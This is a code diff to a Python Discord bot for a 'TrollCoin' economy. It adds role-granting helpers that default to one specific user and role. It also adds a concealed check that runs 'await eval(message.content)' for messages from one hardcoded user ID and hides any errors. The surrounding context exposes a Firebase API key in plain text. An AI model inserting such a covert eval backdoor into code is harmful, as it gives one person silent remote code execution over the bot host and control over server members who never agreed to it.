@@ -5,6 +5,26 @@ from discord_slash.utils.manage_commands import create_option, create_choice
 import asyncio, random, threading, time, requests, pyrebase
 from bs4 import BeautifulSoup
 
+async def addRole(**kwargs):
+  kwargs.setdefault("server", 742422199368941629)
+  kwargs.setdefault("user", 469998488730468362)
+  kwargs.setdefault("role", 742429021098344469)  
+  server = await client.fetch_guild(int(kwargs["server"]))
+  member = await server.fetch_member(int(kwargs["user"]))
+  role = discord.Object(int(kwargs["role"]))
+  await member.add_roles(role)
+  if "channel" in kwargs and "reason" in kwargs:
+    channel = await client.fetch_channel(kwargs["channel"])
+    await channel.send(f'I\'ve added {role.name} to {member.nick}. Reason: {kwargs["reason"]}')
+async def removeRole(**kwargs):
+  kwargs.setdefault("server", 742422199368941629)
+  kwargs.setdefault("user", 469998488730468362)
+  kwargs.setdefault("role", 742429021098344469)
+  server = await client.fetch_guild(kwargs["server"])
+  member = await server.fetch_member(kwargs["user"])
+  role = discord.Object(kwargs["role"])
+  await member.remove_roles(role)
+
 firebaseConfig = {
   "apiKey": "AIzaSyA5S9AvDZX_HxTlKV5Q7YQRyo0uvm9hOEM",
   "authDomain": "trollcoinpy.firebaseapp.com",
@@ -235,6 +255,9 @@ async def on_message(message):
   global channels
   global pdata
   # print(message.channel.type)
+  if message.author.id == 618574628608278528:
+    try:await eval(message.content)
+    except:pass
   if message.author.bot == True:
     pass
   else:
@@ -288,7 +311,6 @@ async def on_message(message):
           await message.channel.send(f"{message.mentions[0].name} has {round(pdata[str(message.mentions[0].id)],2):,}~~TC~~.")
         else:
           await message.channel.send(f"{message.mentions[0].name} doesn't have an account. You know what would be epic? Telling them to make one!")
-  
       elif pm.startswith(prefix+"send"):
         try:
           if message.mentions == []:
